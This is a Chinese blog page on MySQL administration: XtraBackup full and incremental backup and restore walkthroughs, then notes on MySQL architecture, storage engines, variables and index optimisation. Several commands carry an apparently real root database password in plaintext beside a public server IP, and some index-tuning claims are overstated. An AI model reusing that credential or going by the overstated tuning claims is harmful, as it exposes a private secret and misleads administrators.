<span class="token punctuation">[</span>root@c72 src<span class="token punctuation">]</span><span class="token variable">$rpm</span> <span class="token parameter variable">-ql</span> percona-xtrabackup-24-2.4.20-1.el7
/usr/bin/innobackupex
/usr/bin/xbcloud
/usr/bin/xbcloud_osenv
/usr/bin/xbcrypt
/usr/bin/xbstream
/usr/bin/xtrabackup
/usr/lib64/xtrabackup/plugin/keyring_file.so
/usr/lib64/xtrabackup/plugin/keyring_vault.so
/usr/share/doc/percona-xtrabackup-24-2.4.20
/usr/share/doc/percona-xtrabackup-24-2.4.20/COPYING
/usr/share/man/man1/innobackupex.1.gz
/usr/share/man/man1/xbcrypt.1.gz
/usr/share/man/man1/xbstream.1.gz
/usr/share/man/man1/xtrabackup.1.gz</code></pre>

<p><strong>用法：</strong></p>
<p>xtrabackup 工具备份和还原，需要三步实现：</p>
<ol>
<li>备份，对数据库做完全或者增量备份</li>
<li>预准备：还原前，先对备份的数据，整理至一个临时目录</li>
<li>还原：将整理好的数据，复制回数据库目录中</li>
</ol>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 备份</span>
xtrabackup <span class="token punctuation">[</span>--defaults-file<span class="token operator">=</span>/etc/my.cnf<span class="token punctuation">]</span> <span class="token parameter variable">--backup</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>
<span class="token comment"># 预准备</span>
xtrabackup <span class="token punctuation">[</span>--defaults-file<span class="token operator">=</span>/etc/my.cnf<span class="token punctuation">]</span> <span class="token parameter variable">--prepare</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>
<span class="token comment"># 还原</span>
xtrabackup <span class="token punctuation">[</span>--defaults-file<span class="token operator">=</span>/etc/my.cnf<span class="token punctuation">]</span> --copy-back <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span></code></pre>

<p>OPTIONS：</p>
<ul>
<li>–defaults-file：该选项指定从哪个文件读取 MySQL 配置，必须放在命令行第一个选项位置</li>
<li>-u：user 该选项表示备份账号</li>
<li>-p：password 该选项表示备份的密码</li>
<li>-h：host 该选项表示备份数据库的地址</li>
<li><strong>–backup：备份</strong></li>
<li>–databases：该选项接受的参数为数据库名，如果要指定多个数据库，彼此间需要以空格隔开；<br>如：”xtra_test dba_test”，同时，在指定某数据库时，也可以只指定其中的某张表。<br>如：”mydatabase.mytable”。该选项对 innodb 引擎表无效，还是会备份所有 innodb 表</li>
<li>–incremental-basedir：该选项指定为前一次全备份或增量备份的目录，与–incremental 同时使用</li>
<li><strong>–prepare：预准备</strong></li>
<li>–apply-log-only：预准备的过程中，默认回滚未完成的事务，–apply-log 选项能阻止回滚</li>
<li><strong>–copy-back：还原</strong>，拷贝整理好的备份数据到 datadir</li>
<li>–incremental-dir：该选项表示还原时增量备份的目录</li>
</ul>
<p>还原注意事项：</p>
<ol>
<li>保证 datadir 目录为空</li>
<li>还原期间关闭 mysql 服务</li>
<li>重新启动之前，需要<code>chown -R mysql:mysql datadir</code></li>
</ol>
<p><strong>范例 1：完全备份及还原</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 全量备份</span>
<span class="token punctuation">[</span>root@4710419222 backup<span class="token punctuation">]</span><span class="token variable">$mkdir</span> /data/backup
<span class="token punctuation">[</span>root@4710419222 backup<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> <span class="token parameter variable">-uroot</span> -pLujinkai0? <span class="token parameter variable">--backup</span> --target-dir<span class="token operator">=</span>/data/backup/base

<span class="token comment"># 切换到10.0.0.71</span>
<span class="token comment"># 将全量备份拷贝过来</span>
<span class="token punctuation">[</span>root@c71 data<span class="token punctuation">]</span><span class="token variable">$scp</span> <span class="token parameter variable">-r</span> root@47.104.192.22:/data/backup ./
<span class="token comment"># 关闭数据库</span>
<span class="token punctuation">[</span>root@c71 data<span class="token punctuation">]</span><span class="token variable">$systemctl</span> stop mysql.service
<span class="token comment"># 清除数据库，确保datadir目录为空</span>
<span class="token punctuation">[</span>root@c71 data<span class="token punctuation">]</span><span class="token variable">$rm</span> <span class="token parameter variable">-rf</span> /data/mysql/*
<span class="token comment"># 预准备，因为只有一次预准备，所以不加--apply-log-only，提交完成的事务，回滚未完成事务，确保数据一致</span>
<span class="token punctuation">[</span>root@c71 data<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> <span class="token parameter variable">--prepare</span> --target-dir<span class="token operator">=</span>/data/backup/base
<span class="token comment"># 复制预准备完的数据到数据库目录</span>
<span class="token punctuation">[</span>root@c71 data<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> --copy-back --target-dir<span class="token operator">=</span>/data/backup/base
<span class="token punctuation">[</span>root@c71 data<span class="token punctuation">]</span><span class="token variable">$chown</span> <span class="token parameter variable">-R</span> mysql:mysql /data/mysql/
<span class="token comment"># 启动数据库</span>
<span class="token punctuation">[</span>root@c71 data<span class="token punctuation">]</span><span class="token variable">$systemctl</span> start mysqld.service</code></pre>

<p><strong>范例 2：完全、增量备份及还原</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 全量备份</span>
<span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> <span class="token parameter variable">-uroot</span> -pLujinkai0? <span class="token parameter variable">--backup</span> --target-dir<span class="token operator">=</span>/data/backup/base
<span class="token comment"># 第一次增量备份</span>
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> <span class="token parameter variable">-uroot</span> -pLujinkai0? <span class="token parameter variable">--backup</span> --target-dir<span class="token operator">=</span>/data/backup/inc1 --incremental-basedir<span class="token operator">=</span>/data/backup/base
<span class="token comment"># 第二次增量备份</span>
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> <span class="token parameter variable">-uroot</span> -pLujinkai0? <span class="token parameter variable">--backup</span> --target-dir<span class="token operator">=</span>/data/backup/inc2 --incremental-basedir<span class="token operator">=</span>/data/backup/inc1
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$ll</span> /data/backup/
total <span class="token number">12</span>
drwxr-x--- <span class="token number">10</span> root root <span class="token number">4096</span> Oct <span class="token number">23</span> <span class="token number">10</span>:56 base
drwxr-x--- <span class="token number">10</span> root root <span class="token number">4096</span> Oct <span class="token number">23</span> <span class="token number">10</span>:54 inc1
drwxr-x--- <span class="token number">10</span> root root <span class="token number">4096</span> Oct <span class="token number">23</span> <span class="token number">10</span>:58 inc2

<span class="token comment"># 预准备，除了最后一次预准备，其余的都需要加--apply-log-only参数</span>
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> <span class="token parameter variable">--prepare</span> --apply-log-only --target-dir<span class="token operator">=</span>/data/backup/base
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> <span class="token parameter variable">--prepare</span> --apply-log-only --target-dir<span class="token operator">=</span>/data/backup/base --incremental-dir<span class="token operator">=</span>/data/backup/inc1
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> <span class="token parameter variable">--prepare</span> --target-dir<span class="token operator">=</span>/data/backup/base --incremental-dir<span class="token operator">=</span>/data/backup/inc2

<span class="token comment"># 还原</span>
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$systemctl</span> stop mysqld.service
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$rm</span> <span class="token parameter variable">-rf</span> /data/mysql/*
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$ll</span> /data/mysql/
total <span class="token number">0</span>
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$xtrabackup</span> --copy-back --target-dir<span class="token operator">=</span>/data/backup/base
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$chown</span> <span class="token parameter variable">-R</span> mysql:mysql /data/mysql/
<span class="token punctuation">[</span>root@c71 base<span class="token punctuation">]</span><span class="token variable">$systemctl</span> start mysqld.service</code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/MySQL/MySQL%E6%9E%B6%E6%9E%84%E5%92%8C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/MySQL/MySQL%E6%9E%B6%E6%9E%84%E5%92%8C%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" class="post-title-link" itemprop="url">MySQL架构和性能优化</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-12-31 23:08:09" itemprop="dateCreated datePublished" datetime="2020-12-31T23:08:09+08:00">2020-12-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><img data-src="//img.to2b.cn/blog/ljk/1603164166263.png"></p>
<p>MySQL 是 C&#x2F;S 架构，上图是 MySQL 的架构图，从上到下：</p>
<ul>
<li><p>connectors：连接器，编程语言角度可以理解为连入数据库的驱动，mysql 角度称作专用语言对应的链接器</p>
</li>
<li><p>connection pool：mysql 是单进程多线程模型，每个用户连接，都会创建一个单独的连接线程，connection pool 的作用就是维护线程池，管理众多线程应对众多客户端的并发请求，完成并发相应，对于 mysql，它实现的功能包括：</p>
<ul>
<li>authentication：用户认证，校验账号密码</li>
<li>thread reuse：线程重用，用户退出后，线程有可能并非被销毁，而是把它清理完以后，重新收归到线程池当中的空闲线程中去，以完成所谓的线程重用</li>
<li>connection limit：限制线程池的线程数量，决定并发连接的数量，超过上限则排队或拒绝</li>
<li>check memory：检测内存</li>
<li>caches：线程缓存</li>
</ul>
</li>
<li><p>SQL Interface：SQL 解释器 或 SQL 接口，可以理解为 mysql 的外壳，就像 shell 是 linux 的外壳一样。对 SQL 语句做词法分析、句法分析</p>
</li>
<li><p>parser：分析器，解释器分析语法是否有错误，分析器做执行分析，或者加查询翻译，例如 connection pool 校验用户是否合法，parser 检查用户是否有操作权限</p>
</li>
<li><p>optimizer：查询优化器，提高 SQL 的执行效率</p>
</li>
<li><p>caches &amp; buffers：从 mysql8.0 开始已被取消，推荐使用 Redis、Memcached 等软件</p>
</li>
<li><p>pluggable storage engines：插件式存储引擎</p>
<ul>
<li>MySAM：MySQL 经典的存储引擎</li>
<li>InnoDB：Innobase Oy 公司开发，2006 年五月由甲骨文公司并购提供给 MySQL</li>
<li>NDB：主要用于 MySQL Cluster 分布式集群环境</li>
<li>Archive：做归档</li>
<li>…</li>
</ul>
</li>
<li><p>file system：</p>
</li>
<li><p>files &amp; logs：</p>
</li>
</ul>
<p>MySQL 还提供管理和服务工具，例如：备份和恢复工具，安全工具，复制工具，集群服务，管理、配置、迁移、元数据等工具</p>
<h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><ul>
<li>不支持事务，所以崩溃恢复性较差</li>
<li>表级锁定</li>
<li>读写相互锁定，写入时不能读，读时不能写</li>
<li>不支持外键</li>
<li>读取数据快，占用资源少</li>
<li>不支持 MVCC（多版本并发控制机制）高并发</li>
</ul>
<p>数据库文件：</p>
<ul>
<li>tbl_name.frm：储存数据表定义</li>
<li>tbl_name.MYD：存储数据</li>
<li>tbl_name.MYI：存储索引</li>
</ul>
<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><p>Innodb 和 MyISAM 的主要区别在于是否支持事务，其他的区别只是表面区别，根本原因还是是否支持事务导致的</p>
<ul>
<li>行级锁</li>
<li>支持事务，所以崩溃恢复性好</li>
<li>读写阻塞与事务隔离级别相关</li>
<li>支持 MVCC 高并发</li>
</ul>
<p>数据库文件：</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1603181278008.png"></p>
<p>innodb 读取数据是以 page 为单位</p>
<p>innodb_file_per_table &#x3D; ON（mysql5.6.6 后默认开启）设置独立表空间：</p>
<ul>
<li>tbl_name.frm：储存数据表定义</li>
<li>tbl_name.ibd：存储数据和索引，myisam 把数据和索引分开存储，而 innodb 存储在一起</li>
</ul>
<p>innodb_file_per_table &#x3D; OFF 设置共享表空间：</p>
<ul>
<li>tbl_name.frm：储存数据表定义</li>
<li>ibdata1：所有表的数据和索引都存储在 ibdata1 中，默认位于 datadir 目录下</li>
</ul>
<p>关于 ibdata1 文件：</p>
<p>ibdata1 是共享表空间，设置 innodb_file_per_table &#x3D; ON 后，ibdata1 还会增长，那其中存储的数据是什么呢？不太清楚…</p>
<h3 id="其他存储引擎"><a href="#其他存储引擎" class="headerlink" title="其他存储引擎"></a>其他存储引擎</h3><p>Performance_Schema、Memory、MRG_MyISAM、Archive、Federated 联合、BDB、Cluster&#x2F;NDB、CSV、BLACKHOLE、example</p>
<h3 id="管理存储引擎"><a href="#管理存储引擎" class="headerlink" title="管理存储引擎"></a>管理存储引擎</h3><ul>
<li>查看</li>
</ul>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查看mysql支持的存储引擎</span>
<span class="token keyword">show</span> engines<span class="token punctuation">;</span>

<span class="token comment"># 查看当前默认的存储引擎</span>
<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%storage_engine%'</span><span class="token punctuation">;</span>

<span class="token comment"># 查看库中所有表使用的存储引擎</span>
<span class="token keyword">show</span> <span class="token keyword">table</span> <span class="token keyword">status</span> <span class="token keyword">from</span> db_name<span class="token punctuation">;</span>

<span class="token comment"># 查看库中指定表的存储引擎</span>
<span class="token keyword">show</span> <span class="token keyword">table</span> <span class="token keyword">status</span> <span class="token operator">like</span> <span class="token string">'tb_name'</span><span class="token punctuation">;</span>
<span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">table</span> tb_name<span class="token punctuation">;</span></code></pre>

<ul>
<li>设置</li>
</ul>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 设置默认的存储引擎</span>
vim <span class="token operator">/</span>etc<span class="token operator">/</span>my<span class="token punctuation">.</span>cnf
<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
default_storage_engine<span class="token operator">=</span> <span class="token keyword">InnoDB</span>

设置表的存储引擎：
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> tb_name<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span><span class="token punctuation">;</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tb_name <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span><span class="token punctuation">;</span></code></pre>

<h2 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h2><ul>
<li><p><strong>mysql</strong><br>是 mysql 的核心数据库，类似于 Sql Server 中的 master 库，主要负责存储数据库的用户、权限设置、关键字等 mysql 自己需要使用的控制和管理信息</p>
</li>
<li><p><strong>performance_schema</strong><br>MySQL 5.5 开始新增的数据库，主要用于收集数据库服务器性能参数,库里表的存储引擎均为 PERFORMANCE_SCHEMA，用户不能创建存储引擎为 PERFORMANCE_SCHEMA 的表</p>
</li>
<li><p><strong>information_schema</strong><br>MySQL 5.0 之后产生的，一个虚拟数据库，物理上并不存在 information_schema 数据库类似与“数据字典”，提供了访问数据库元数据的方式，即数据的数据。比如数据库名或表名，列类型，访问权限（更加细化的访问方式）</p>
</li>
<li><p><strong>sys</strong><br>MySQL5.7 之后新增加的数据库，库中所有数据源来自 performance_schema。目标是 performance_schema 的把复杂度降低，让 DBA 能更好的阅读这个库里的内容。让 DBA 更快的了解 DB 的运行情况</p>
</li>
</ul>
<h2 id="服务器配置和状态"><a href="#服务器配置和状态" class="headerlink" title="服务器配置和状态"></a>服务器配置和状态</h2><h3 id="服务器选项"><a href="#服务器选项" class="headerlink" title="服务器选项"></a>服务器选项</h3><ul>
<li>查看 mysqld 可用选项列表及当前值</li>
</ul>
<pre class="language-sql" data-language="sql"><code class="language-sql">mysqld <span class="token comment">--verbose --help</span></code></pre>

<ul>
<li>获取 mysqld 当前启动选项</li>
</ul>
<pre class="language-sql" data-language="sql"><code class="language-sql">mysqld <span class="token comment">--print-defaults</span></code></pre>

<h3 id="服务器系统变量"><a href="#服务器系统变量" class="headerlink" title="服务器系统变量"></a>服务器系统变量</h3><p>分为全局和会话两种：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查看所有系统变量</span>
<span class="token keyword">SHOW</span> <span class="token punctuation">[</span><span class="token keyword">SESSION</span><span class="token punctuation">]</span> VARIABLES<span class="token punctuation">;</span>	<span class="token comment"># SESSION是关键字，不是变量</span>
<span class="token comment"># 查看global变量</span>
<span class="token keyword">SHOW</span> <span class="token keyword">GLOBAL</span> VARIABLES<span class="token punctuation">;</span>

<span class="token comment"># 查看指定的系统变量</span>
<span class="token keyword">SHOW</span> VARIABLES <span class="token operator">LIKE</span> <span class="token string">'VAR_NAME'</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> @<span class="token variable">@VAR_NAME</span><span class="token punctuation">;</span></code></pre>

<p>修改变量：仅对修改后新创建的会话有效；对已经建立的会话无效</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 修改全局变量</span>
<span class="token keyword">SET</span> <span class="token keyword">GLOBAL</span> system_var_name<span class="token operator">=</span><span class="token keyword">value</span><span class="token punctuation">;</span>
<span class="token keyword">SET</span> @<span class="token variable">@global.system_var_name</span><span class="token operator">=</span><span class="token keyword">value</span><span class="token punctuation">;</span>

<span class="token comment"># 修改会话变量</span>
<span class="token keyword">SET</span> <span class="token punctuation">[</span><span class="token keyword">SESSION</span><span class="token punctuation">]</span> system_var_name<span class="token operator">=</span><span class="token keyword">value</span><span class="token punctuation">;</span>
<span class="token keyword">SET</span> @@<span class="token punctuation">[</span><span class="token keyword">session</span><span class="token punctuation">.</span><span class="token punctuation">]</span>system_var_name<span class="token operator">=</span><span class="token keyword">value</span><span class="token punctuation">;</span></code></pre>

<p><font color='red'>注意：</font>选项 和 变量长得很像，不要搞混，选项和变量使用中使用下划线_或者横线-都可以，但是默认变量使用下划线，选项使用横线，这点在使用 grep 查询的时候要注意<br>选项列表：<code>mysqld --verbose --help</code><br>变量列表：<code>show variables;</code><br>变量修改都是临时性的，重启服务就失效了，要想永久设置，需要修改或添加配置文件（my.conf）中的相关选项</p>
<h4 id="SQL-MODE"><a href="#SQL-MODE" class="headerlink" title="SQL_MODE"></a>SQL_MODE</h4><p>SQL_MODE：对其设置可以完成一些约束检查的工作,可分别进行全局的设置或当前会话的设置</p>
<p>常见 MODE：</p>
<ul>
<li>NO_AUTO_CREATE_USER： 禁止 GRANT 创建密码为空的用户</li>
<li>NO_ZERO_DATE：在严格模式，不允许使用’0000-00-00’的时间</li>
<li>ONLY_FULL_GROUP_BY： 对于 GROUP BY 聚合操作，如果在 SELECT 中的列，没有在 GROUP BY 中出现，那么将认为这个 SQL 是不合法的</li>
<li>NO_BACKSLASH_ESCAPES： 反斜杠“\”作为普通字符而非转义字符</li>
<li>PIPES_AS_CONCAT： 将”||”视为连接操作符而非“或”运算符</li>
</ul>
<p>变量只能临时修改，所以选项也提供了 sql_mode，以便可以永久修改</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># sql_mode 变量</span>
<span class="token number">06</span>:<span class="token number">47</span>:<span class="token number">43</span><span class="token punctuation">(</span>root<span class="token variable">@localhost</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'sql_mode'</span><span class="token punctuation">;</span>
<span class="token comment"># sql_mode 选项</span>
<span class="token punctuation">[</span>root<span class="token variable">@c71</span> <span class="token operator">~</span><span class="token punctuation">]</span>$mysqladmin <span class="token operator">-</span>uroot <span class="token operator">-</span>plujinkai variables <span class="token operator">|</span> grep sql_mode</code></pre>

<h3 id="服务器状态变量"><a href="#服务器状态变量" class="headerlink" title="服务器状态变量"></a>服务器状态变量</h3><p>分为全局状态 和 会话状态，状态变量是只读的，用于保存 mysqld 运行中统计数据的变量，不可更改</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SHOW</span> <span class="token punctuation">[</span><span class="token keyword">SESSION</span><span class="token punctuation">]</span> <span class="token keyword">STATUS</span><span class="token punctuation">;</span>
<span class="token keyword">SHOW</span> <span class="token keyword">GLOBAL</span> <span class="token keyword">STATUS</span><span class="token punctuation">;</span></code></pre>

<h2 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h2><p>了解即可，MySQL8.0 中已经取消了查询缓存</p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><h3 id="索引的类型"><a href="#索引的类型" class="headerlink" title="索引的类型"></a>索引的类型</h3><p>关于索引的类型，这部分比较难，先跳过吧，等学学数据结构再回来看\</p>
<h3 id="索引会失效的情况"><a href="#索引会失效的情况" class="headerlink" title="索引会失效的情况"></a>索引会失效的情况</h3><ul>
<li><p>列与列对比：某个表中，有两列（id 和 c_id）都建了单独索引，下面这种查询条件不会走索引</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span>c_id<span class="token punctuation">;</span></code></pre>
</li>
<li><p>索引设置的列中出现了 NULL 值，此列在使用时不会使用索引</p>
</li>
<li><p>&lt;&gt;、NOT、in、not exists 这类查询条件为非时，索引定位很困难</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">&lt;></span><span class="token number">500</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> <span class="token operator">not</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> <span class="token operator">not</span> <span class="token keyword">exists</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> test_02 <span class="token keyword">where</span> test_02<span class="token punctuation">.</span>id<span class="token operator">=</span>test<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>LIKE 模糊搜索时，前置通配符会让索引失效，例如查询姓张的人 <code>like 张%</code>会走索引，但是查询叫明的人 <code>like %明</code>，索引会失效</p>
</li>
<li><p>对索引使用计算，可能会让索引失效，例如：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> upper<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'SUNYANG'</span><span class="token punctuation">;</span>		<span class="token comment"># 索引失效</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> name<span class="token operator">=</span>upper<span class="token punctuation">(</span><span class="token string">'sunyang'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment"># 没有对索引进行计算，所以索引不失效</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> sunyang <span class="token keyword">where</span> id<span class="token operator">/</span><span class="token number">2</span><span class="token operator">=</span>:type_id<span class="token punctuation">;</span>		<span class="token comment"># 索引失效</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> sunyang <span class="token keyword">where</span> id<span class="token operator">=</span>:type_id<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>		<span class="token comment"># 没有对索引进行计算，所以索引不失效</span></code></pre>
</li>
<li><p>复合索引前导列区分大，前导列区分度大，且查后导列的时候，前导列的分裂会非常耗资源，执行计划想，还不如全表扫描来的快，然后就索引失效了</p>
</li>
<li><p>当查询条件存在隐式转换时，索引会失效。比如在数据库里 id 存的 number 类型，但是在查询时，却用了下面的形式：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> sunyang <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">;</span></code></pre></li>
</ul>
<h3 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h3><ul>
<li>对于经常在 where 子句使用的列，最好设置索引</li>
<li>对于有多个列 where 或者 order by 子句，应该建立复合索引</li>
<li>不要在索引列上进行运算（函数操作和表达式操作）</li>
<li>尽量使用短索引，如果可以，应该制定一个前缀长度</li>
<li>多列索引：AND 操作时更适合使用多列索引，而非为每个列创建单独的索引</li>
<li>索引的最左前缀原则</li>
<li>选择合适的索引列顺序：无排序和分组时，将选择性最高放左侧</li>
<li>每个列都要设置<code>NOT NULL</code>，并设置 DEFAULT 值，并且 DEFAULT 值不要设置空串，可以给一个空格</li>
<li>LIKE 语句，尽量使用后置通配符，不要使用前置通配符</li>
<li>尽量不要使用&lt;&gt;、NOT、in、not exists 操作，虽然可能使用索引，但性能不高</li>
<li>查询时，能不要 *就不用 *，尽量写全字段名，比如：<code>select id,name,age from students;</code></li>
<li>大部分情况连接效率远大于子查询，但是数据量大的时候，连接要尽量不要用</li>
<li>在有大量记录的表分页时使用 limit</li>
<li>多使用 explain 和 profile 分析查询语句</li>
<li>查看慢查询日志，找出执行时间长的 sql 语句优化</li>
</ul>
<h4 id="优化表空间"><a href="#优化表空间" class="headerlink" title="优化表空间"></a>优化表空间</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">OPTIMIZE</span> <span class="token keyword">TABLE</span> tb_name<span class="token punctuation">;</span></code></pre>

<h3 id="管理索引"><a href="#管理索引" class="headerlink" title="管理索引"></a>管理索引</h3><p>给已存在的表添加索引：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tbl_name <span class="token keyword">ADD</span> <span class="token keyword">INDEX</span> index_name<span class="token punctuation">(</span>index_col_name<span class="token punctuation">[</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>删除索引：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">INDEX</span> index_name <span class="token keyword">ON</span> tbl_name<span class="token punctuation">;</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> tbl_name <span class="token keyword">DROP</span> <span class="token keyword">INDEX</span> index_name<span class="token punctuation">(</span>index_col_name<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>查看索引：</p>
